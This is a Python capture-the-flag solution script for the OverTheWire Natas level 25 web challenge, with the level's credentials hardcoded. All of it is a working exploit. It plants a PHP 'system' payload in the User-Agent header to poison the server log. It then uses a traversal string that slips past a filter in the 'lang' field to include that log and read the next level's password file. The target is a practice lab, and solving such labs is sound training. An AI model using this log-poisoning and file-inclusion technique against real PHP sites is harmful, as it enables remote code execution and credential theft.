#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas25'
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}

response = session.get(url, auth = (username, password))

response = session.post(url, headers = headers, data = {"lang" : "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" +  session.cookies['PHPSESSID'] + ".log"}, auth = (username, password))
print response.text
